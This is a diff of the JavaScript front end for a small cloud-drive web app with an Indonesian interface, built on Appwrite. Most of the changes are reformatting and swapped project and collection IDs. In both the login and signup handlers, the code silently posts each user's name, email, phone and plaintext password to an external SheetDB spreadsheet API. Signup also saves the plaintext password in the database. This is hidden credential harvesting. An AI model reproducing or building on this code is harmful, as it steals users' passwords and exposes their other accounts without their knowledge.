@@ -6,11 +6,11 @@ const storage = new Appwrite.Storage(client);
 // KONFIGURASI
 const CONFIG = {
     ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
-    PROJECT_ID: '697f71b40034438bb559', 
-    DB_ID: 'storagedb',
-    COLLECTION_FILES: 'files',   
-    COLLECTION_USERS: 'users',   
-    BUCKET_ID: 'taskfiles'
+    PROJECT_ID: '69cb16b0002ee20f2a3d',
+    DB_ID: '6a5a634d003e4a12170a',
+    COLLECTION_FILES: 'files_backups',
+    COLLECTION_USERS: 'users_backups',
+    BUCKET_ID: '6a5a6943000f133e6a35'
 };
 const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';
 
@@ -46,8 +46,8 @@ async function loadFiles(folderId) {
     const header = el('headerTitle');
 
     // Breadcrumb Logic
-    if(folderId === 'root') {
-        updateGreeting(); 
+    if (folderId === 'root') {
+        updateGreeting();
     } else {
         header.innerHTML = `<button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 15px; margin-right:15px; display:inline-flex; align-items:center; gap:5px;"><i class="fa-solid fa-arrow-left"></i> Kembali</button> ${currentFolderName}`;
     }
@@ -57,8 +57,8 @@ async function loadFiles(folderId) {
             Appwrite.Query.equal('owner', currentUser.$id),
             Appwrite.Query.equal('parentId', folderId)
         ]);
-        
-        if(res.documents.length === 0) {
+
+        if (res.documents.length === 0) {
             grid.innerHTML = `<p style="color:rgba(255,255,255,0.4); width:100%; text-align:center; grid-column: 1/-1; margin-top:50px;">Folder ini masih kosong</p>`;
         } else {
             res.documents.forEach(doc => renderItem(doc));
@@ -97,7 +97,7 @@ function renderItem(doc) {
 window.openFolder = (id, nama) => { currentFolderId = id; currentFolderName = nama; loadFiles(id); };
 
 window.submitCreateFolder = async () => {
-    const n = el('newFolderName').value.trim(); if(!n) return;
+    const n = el('newFolderName').value.trim(); if (!n) return;
     closeModal('folderModal'); el('loading').classList.remove('hidden');
     try {
         await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
@@ -143,8 +143,8 @@ window.nav = (p) => { document.querySelectorAll('section').forEach(s => s.classL
 window.openModal = (m) => el(m).classList.remove('hidden');
 window.closeModal = (m) => el(m).classList.add('hidden');
 window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
-window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
-function updateGreeting() { const h = new Date().getHours(); let s = "Morning"; if(h>=12) s="Afternoon"; if(h>=18) s="Night"; el('headerTitle').innerText = `Welcome In Drive ${s}`; }
+window.togglePass = (id, icon) => { const i = el(id); i.type = i.type === 'password' ? 'text' : 'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
+function updateGreeting() { const h = new Date().getHours(); let s = "Morning"; if (h >= 12) s = "Afternoon"; if (h >= 18) s = "Night"; el('headerTitle').innerText = `Welcome In Drive ${s}`; }
 el('dropZone').addEventListener('dragover', (e) => e.preventDefault());
 el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileSelect(e.dataTransfer.files[0]); });
 el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
@@ -163,9 +163,9 @@ if (el('loginForm')) el('loginForm').addEventListener('submit', async (e) => {
         }
         await account.createEmailPasswordSession(id, pw);
         currentUser = await account.get();
-        fetch(`${SHEETDB_API}?sheet=Login`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: [{"ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": pw, "Riwayat Waktu": new Date().toLocaleString()}]}) });
+        fetch(`${SHEETDB_API}?sheet=Login`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [{ "ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": pw, "Riwayat Waktu": new Date().toLocaleString() }] }) });
         checkSession();
-    } catch(e) { alert(e.message); }
+    } catch (e) { alert(e.message); }
 });
 
 if (el('signupForm')) el('signupForm').addEventListener('submit', async (e) => {
@@ -174,7 +174,7 @@ if (el('signupForm')) el('signupForm').addEventListener('submit', async (e) => {
     try {
         const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
         await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
-        fetch(`${SHEETDB_API}?sheet=SignUp`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: [{"ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString()}]}) });
+        fetch(`${SHEETDB_API}?sheet=SignUp`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: [{ "ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString() }] }) });
         alert("Berhasil!"); nav('loginPage');
     } catch (e) { alert(e.message); }
 });
